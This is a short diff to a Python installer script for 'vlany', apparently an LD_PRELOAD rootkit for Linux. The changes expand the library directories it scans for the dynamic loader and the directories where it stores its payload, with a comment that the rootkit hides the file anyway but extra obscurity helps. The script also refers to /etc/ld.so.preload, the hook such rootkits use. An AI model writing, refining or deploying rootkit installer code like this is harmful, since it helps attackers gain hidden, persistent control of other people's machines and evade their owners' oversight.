@@ -14,8 +14,8 @@ import random
 import string
 import subprocess
 
-LIB_DIRS = ["/lib/", "/lib32/", "/lib64/", "/libx32/"]
-P_DIRS = ["/bin/", "/sbin/", "/etc/", "/home/", "/lib/", "/lib64/", "/opt/",  "/usr/", "/var/"] # doesn't really matter where the file is stored since vlany hides it anyway but nothing like a little more obscurity
+LIB_DIRS = ["/lib/", "/lib/x86_64-linux-gnu/", "/lib32/", "/libx32/", "/lib64/"]
+P_DIRS = ["/bin/", "/sbin/", "/etc/", "/home/", "/lib/", "/libx32/", "/lib64/", "/opt/",  "/usr/", "/var/"] # doesn't really matter where the file is stored since vlany hides it anyway but nothing like a little more obscurity
 
 O_PRELOAD = "/etc/ld.so.preload"
 
@@ -59,7 +59,7 @@ def get_ld_locations():
 	for _ in LIB_DIRS:
 		if os.path.exists(_):
 			for x in os.listdir(_):
-				if x.startswith("ld-"):
+				if x.startswith("ld-2"):
 					lib_locations += "{0}{1}\n".format(_, x)
 	return lib_locations
 
